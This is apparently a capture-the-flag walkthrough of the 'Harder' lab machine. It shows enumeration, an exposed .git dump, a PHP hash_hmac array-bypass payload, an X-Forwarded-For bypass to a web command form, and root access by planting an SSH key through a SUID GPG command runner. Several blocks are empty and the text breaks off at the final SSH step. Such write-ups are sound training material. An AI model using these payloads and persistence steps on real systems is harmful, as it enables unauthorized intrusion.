Task 1:
-------

The machine is completely inspired by real world pentest findings. Perhaps you will consider them very challenging but without any rabbit holes. Once you have a shell it is very important to know which underlying Linux distribution is used and where certain configurations are located.

Hints to the initial foothold: Look closely at every request. Re-scan all newly found web services/folders and may use some wordlists from seclists ([https://tools.kali.org/password-attacks/seclists](https://tools.kali.org/password-attacks/seclists)). Read the source with care.

Port Scan
---------

```console
$ nmap -sC -sV <ip>  
PORT   STATE SERVICE VERSION  
22/tcp open  ssh     OpenSSH 8.3 (protocol 2.0)  
80/tcp open  http    nginx 1.18.0  
|\_http-server-header: nginx/1.18.0  
|\_http-title: Error
```

Looking at the result of the nmap, we only have two ports open. As ssh doesn't have that much of a attack surface, lets test port 80.

PORT 80
-------

![image](https://miro.medium.com/max/1000/1*3kdi5X8i7leWtvDb9qR-sA.png)

I tried to look for files like robots.txt ,sitemap.xml and also for the files like index.php, index.html, index.pl to get the idea of what the backend server might be running. But they all gave the same 404 error page.

Looking at the left bottom of the page, we know that the site is running php-fpm.

So next logical step will be using gobuster to find out the files and directories on the website.

GOBUSTER
--------

```console
$ gobuster dir -u [http://10.10.149.170/](http://10.10.149.170/) -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -x php

```

As we are getting response OK (200) for each page that doesn't exists, we cant enumerate files and folder using gobuster.

Whenever we see unusual pattern, it is always better to analyse the request using Burp Suite.

Analyzing request over Burp Suite
---------------------------------

Request

```

Response

```

Content-Length: 1985
```

Looking at the response headers, we now know the exact version of nginx and PHP on the webserver and we found a new virtual host on the server.

So, we add the entry on our /etc/hosts file.

```
10.10.149.170   pwd.harder.local
```

**Visiting pwd.harder.local**
-----------------------------

![image](https://miro.medium.com/max/700/1*nGyl4hgnia-yO93cGVbgMw.png)

We get a login page. Till now we do not have any credentials to try on this login page. But before thinking of brute forcing, I always like to try some common credentials like admin admin , admin password and so on. And with username as admin and password as admin, we get in.

![image](https://miro.medium.com/max/542/1*25HqSKkwHjRnZvVGbHpXug.png)

Running Gobuster on this site.
------------------------------

```console
$ gobuster dir -u [http://pwd.harder.local/](http://pwd.harder.local/) -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
/index.php  
/auth.php  
/secret.php
```

But I didn't get anything by visiting the found sites.

And then I remembered the tag on the room ie. git. So, I thought if this is a git repository, there might a .git folder.

![image](https://miro.medium.com/max/700/1*T7XHYp7wq18MMVZJcwlTtg.png)

And we get 403 forbidden.

Then to make sure, I tried to open a link that doesn't exists.

![image](https://miro.medium.com/max/700/1*dxamb8sHDyyiwh0a7bOsXQ.png)

So, there is definitely a .git directory on the server.

So, I used a tool called [git-dumper](https://github.com/arthaud/git-dumper) to download all the files.

```console

----------------------------

```console
$ ls -an git-src/

-rw-r--r-- 1 1000 1000   608 Aug 17 12:29 index.php
```

Content inside index.php
------------------------

```php 
<?php  
  session_start();  
  require("auth.php");  
  $login = new Login;  
  $login->authorize();  
  require("hmac.php");  
  require("credentials.php");  
?>   
  <table style="border: 1px solid;">  
     <tr>  
       <td style="border: 1px solid;">url</td>  
       <td style="border: 1px solid;">username</td>  
       <td style="border: 1px solid;">password (cleartext)</td>  
     </tr>  
     <tr>  
       <td style="border: 1px solid;"><?php echo $creds[0]; ?></td>  
       <td style="border: 1px solid;"><?php echo $creds[1]; ?></td>  
       <td style="border: 1px solid;"><?php echo $creds[2]; ?></td>  
     </tr>  
   </table>
```

Here, it includes a file auth.php and is calling a method authorize in the file auth.php, and it is including files hmac.php and credentials.php. And at last, it prints out the URL, username and password.

We have files auth.php and hmac.php locally but we don’t have the file credentials.php.

Contents inside auth.php
------------------------

auth.php has a lot of content. To summarize, it tries to login with username and password provided by user and the requests dies if the username is not equal to admin and password not equal to admin.

```php 
<?php                                                                                                                               define('LOGIN_USER', "admin"); 
define('LOGIN_PASS', "admin");  
```

Contents inside hmac.php
------------------------

```php 
<?php  
if (empty($_GET['h']) || empty($_GET['host'])) {  
   header('HTTP/1.0 400 Bad Request');  
   print("missing get parameter");  
   die();  
}  
require("secret.php"); //set $secret var  
if (isset($_GET['n'])) {  
   $secret = hash\_hmac('sha256', $_GET['n'], $secret);  
}$hm = hash_hmac('sha256', $_GET['host'], $secret);  
if ($hm !== $_GET['h']){  
  header('HTTP/1.0 403 Forbidden');  
  print("extra security check failed");  
  die();  
}  
?>
```

Here the script first checks if either **$\_GET\[‘h’\]** or **$\_GET\[‘host’**\] is empty. If one of them is empty, it print something and connection dies.

Then it includes a file **secret.php**, which we don’t have in the git repository.

Then if the **$\_GET\[‘n’**\] is not empty, it generates a SHA256 hash value using HMAC method and the key is included from secret.php file and the new hash is kept on variable **$secret**.

Now using that hash in $secret as a key, SHA256 hash of **$\_GET\[‘host’**\] parameter is generated and stored in variable **$hm**.

And finally if $hm is not equal to **$\_GET\[‘h’\],** the connection dies.

So now we have to predict the final result and pass it on **$\_GET\[‘h’\].** Seems impossible right, as we don’t know what is the content of that secret.php file.

And while I was looking around to bypass our condition, I came across [this](https://www.securify.nl/blog/spot-the-bug-challenge-2018-warm-up) article which explains how we can bypass this condition.

What it does it, pass **$\_GET\[’n’\]** as array which in turns gives the value of $secret as **false**.

```console 
php> $secret = hash_hmac('sha256', Array(), "SecretKey");  
php> echo $secret == false  
1
```

Read the article for understanding of how this concept works.

Final payload

```console 
/?n[]=&host=securify.nl&h=c8ef9458af67da9c9086078ad3acc8ae71713af4e27d35fd8d02d0078f7ca3f5
```

And we get the credentials

![image](https://miro.medium.com/max/700/1*n_hn3lVYeclTf_eNPRpjqw.png)

```
url:http://shell.harder.htb  
username:evs  
password:<password>
```

Looking at the URL, it was a little bit weird.It looks like an URL that you usually see on [Hack The Box](https://www.hackthebox.eu/) platform.

Having doubts on my mind, I added the entry on my _/etc/hosts_ file which later, I regretted very much.

```
10.10.149.170   pwd.harder.local shell.harder.htb
```

Shell.harder.htb
----------------

![image](https://miro.medium.com/max/700/1*4ZjbkiGpA0i9UBLx-ysgbA.png)

We get the same page that we have got earlier. Now thinking the shell on the URL, I thought there was some kind of webshell. But I couldn't enumerate the files and folders here. But as I was fuzzing around, i found something interesting.

_/Index.php_ **gives 404 nothing here page with response code 200**

![image](https://miro.medium.com/max/700/1*jK3MKeoDb6hfaIkm7aI7cQ.png)

_/this\_page\_doesnot\_exists.php_ **gives 404 not found**

![image](https://miro.medium.com/max/700/1*25kcSfXxvSprx6xgfTigpQ.png)

So looks like we can enumerate the **.php** files on the web server.

So first thing I tried the PHP Backdoor shells using **Gobuster**.

The wordlist that I used can be found [here](https://github.com/danielmiessler/SecLists).

```console 
$ gobuster dir -u [http://shell.harder.htb/](http://shell.harder.htb/) -w /opt/SecLists-master/Discovery/Web-Content/CommonBackdoors-PHP.fuzz.txt  --wildcard
```

But I got nothing.

Then I used [**wfuzz**](https://github.com/xmendez/wfuzz) to find if there are any other PHP files.

```console 
$ wfuzz -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 [http://shell.harder.htb/FUZZ.php](http://shell.harder.htb/FUZZ.php)000000001:   200        73 L     166 W    1985 Ch     "index"                                                                                                          
000000002:   200        959 L    5171 W   86626 Ch    "phpinfo"
```

I visited both links, and apart from the information on phpinfo, I did not get any hint of a web shell.

Thinking that these files may need parameters for command execution, I used Burp to fuzz the parameters.

```
GET /index.php?§cmd§=ls%20-la%20/ HTTP/1.1  
Host: shell.harder.htb  
Cache-Control: max-age=0  
Upgrade-Insecure-Requests: 1  
User-Agent: Mozilla/5.0 (X11; Linux x86\_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

Accept-Encoding: gzip, deflate  
Accept-Language: en-US,en;q=0.9,ne;q=0.8  
Connection: close
```

Used wordlist

```console 
/opt/SecLists-master/Discovery/Web-Content/burp-parameter-names.txt
```

But I got nothing. And when I was just about to give up, my friend gave me a hint that somethings are not what they look like. At this point in time, I was completely out of mind and forgotten that the URL looked weird. Then after my friend’s suggestion, I made the sane decision of adding **shell.harder.local** to my _/etc/hosts_ file.

```
10.10.149.170   pwd.harder.local shell.harder.htb shell.harder.local
```

Shell.harder.local
------------------

![image](https://miro.medium.com/max/700/1*ATlJ-EnFjmhIAW5LnZuTDA.png)

Finally, I got a login page. I logged in using the credentials I had got earlier and got this message.

![image](https://miro.medium.com/max/534/1*4IxeZvpeoo00qbPmA4Y06A.png)

Intercepting the request with burp
----------------------------------

```

```

Searching around I found different headers that can be used to bypass this check.

And **X-Forwareded-For** did the trick.

**Request**

```

```

**Response**

```php 
<div class="container"><div class="pb-2 mt-4 mb-2">  
            <h2> Execute a command </h2>  
        </div><form method="POST">  
            <div class="form-group">  
                <label for="cmd"><strong>Command</strong></label>  
     <input type="text" class="form-control" name="cmd" id="cmd" value="" required>  
                    
           </div>  
            <button type="submit" class="btn btn-primary">Execute</button>  
        </form><div class="pb-2 mt-4 mb-2">

        </div>  
        <pre><small>No result.</small></pre>  
    </div>
```

So now, we can execute command by using post method using parameter **cmd**.

**POST Request Parameter**

```
action=set_login&user=evs&pass=<password>&cmd=ls -la
```

**Partial Response**

```console 
total 44  
drwxr-xr-x    1 www      www           4096 Oct  3  2019 .  
drwxr-xr-x    1 www      www           4096 Jul  7 22:28 ..  
-rw-r--r--    1 www      www          23838 Oct  3  2019 auth.php

drwxr-xr-x    4 www      www           4096 Oct  3  2019 vendor
```

Now the next step would be to get a reverse shell. I normally use [this](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) reverse shell cheat sheet to get the reverse shell.

There was no bash on the server but there was netcat and python3. So, I tried those payloads to get the reverse shell. But for some reason, I was just getting the connection back but no shell. So after trying for some time, I left and started manual enumeration.

And after searching for a long time, I got a **evs-backup.sh** file, having login credentials for evs.

**POST Request Parameter**

```
action=set_login&user=evs&pass=<password>&cmd=find / -type f -name "*.sh" 2>/dev/null
```

**Partial Response**

```console 
/usr/bin/findssl.sh  
/usr/local/bin/run-crypted.sh  
/etc/periodic/15min/evs-backup.sh  
/dev/shm/linpeas.sh
```

File contents
-------------

**POST Request Parameter**

```
action=set_login&user=evs&pass=<password>&cmd=cat /etc/periodic/15min/evs-backup.sh
```

**Partial Response**

```

```

**evs:<password>**

Lets try to login with ssh and finally we get in.

```console 
$ ssh evs@10.10.171.102  
evs@10.10.171.102's password: <password>

-rwxr-x--- 1 root evs /usr/local/bin/run-crypted.sh                                                                                            
-rwxr-x--- 1 root evs /var/backup/root@harder.local.pub
```

First file **/usr/local/bin/execute-crypted** is owned by root and has SUID bit enabled which can be potential vector for our priv esc.

**Running /usr/local/bin/execute-crypted**

```console 
harder:/dev/shm$ /usr/local/bin/execute-crypted   
[*] Current User: root  
[-] This program runs only commands which are encypted for root@harder.local using gpg.  
[-] Create a file like this: echo -n whoami > command  
[-] Encrypt the file and run the command: execute-crypted command.gpg  
harder:/dev/shm$
```

The output says

*   It is currently running as root.
*   It runs files which are encrypted for **root@harder.local** and files can be executed as execute-crypted \<encrypted-file.gpg\>.

So we need a public GPG key to encrypt our payload and only we can have command execution as root.

**Checking for keys**

```console 
harder:/dev/shm$ gpg --list-keys  
harder:/dev/shm$
```

NO keys were found.

But if we checked the result from **linpeas.sh**, we have a file **/var/backup/root@harder.local.pub** containing the public key.

Content of **/var/backup/root@harder.local.pub**

Importing the key
-----------------

```console 
harder:/dev/shm$ gpg --import /var/backup/root@harder.local.pub   
gpg: key C91D6615944F6874: public key "Administrator <root@harder.local>" imported  
gpg: Total number processed: 1  
gpg:               imported: 1
```

**Now listing keys**

```console 
harder:/dev/shm$ gpg --list-keys  
/home/evs/.gnupg/pubring.kbx  
----------------------------  
pub   ed25519 2020-07-07 [SC]

uid           [ unknown] Administrator <root@harder.local>  
sub   cv25519 2020-07-07 [E]  
harder:/dev/shm$
```

**Creating payload**
--------------------

Generating ssh key pairs on **local computer**

```console  
$ ssh-keygen -f root  
Generating public/private rsa key pair.  
Enter passphrase (empty for no passphrase):   
Enter same passphrase again:   
Your identification has been saved in root.  
Your public key has been saved in root.pub.
```

On remote box, creating a directory _/root/.ssh_ and copying **root.pub** from our **local box** to _/root/.ssh/authorized\_keys_

**Contents of file commands**

```console  
#!/bin/sh  
mkdir /root/.ssh/  
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC4naClwknGPG6EXz29MFZEEO1/4n7uo6GiOC/5eh8xDFgmUjulNxcVREUiEGEB+KrE3W7ZHQ+spri9JhcZ7QRK5cEq1HfbdcXLJEPgDimkeG1wktsOYlg4Xj1pjZOGzPVj0SAO8QZmEfiiB7aYsDYXK2z3bM1rjcdgB48CWFwCd7gMwFgoDCqsWDCfQsSlaXl459y3xdYfSfb1ZPszQlOohWKWANdqwZTHGtHybuGLtb1gbeg5z55gx1C7OBeYIWkYCR0zVzLzwJem1UaLOPsWvvg4mzSdOVSB//dL/T87yQkt2Pv6dDw8zvuAlaXIbFOw02uBobIIYVpJVtrUC47yNMBFSpAfPIZX/IpN8XgRhRr5imBCH2N8u3zMYhgBb6yUKS0cR55SJUzdojNi+s0X0pJeNtKiWB4Q3at3pHe/KffkGBZfEJ/98GIig6arVWw3z/5tRDhePhrpIlGG1nPtAN6NruC3Sap5YfJAmSiQEcQqMFAqlsoTYxTY4RE1Cqc=" >>/root/.ssh/authorized_keys

**Encrypting the file with GPG public key**

```console

in the user ID.  If you *really* know what you are doing,  
you may answer the next question with yes.Use this key anyway? (y/N) y  
harder:/dev/shm$
```

**Execution**
-------------

```console  
harder:/dev/shm$ /usr/local/bin/execute-crypted /dev/shm/commands.gpg   
gpg: encrypted with 256-bit ECDH key, ID 6C1C04522C049868, created 2020-07-07  
      "Administrator <root@harder.local>"  
harder:/dev/shm$
```

Now lets try to ssh from our box
--------------------------------

```console  
$ ssh -i root root@10.10.171.102
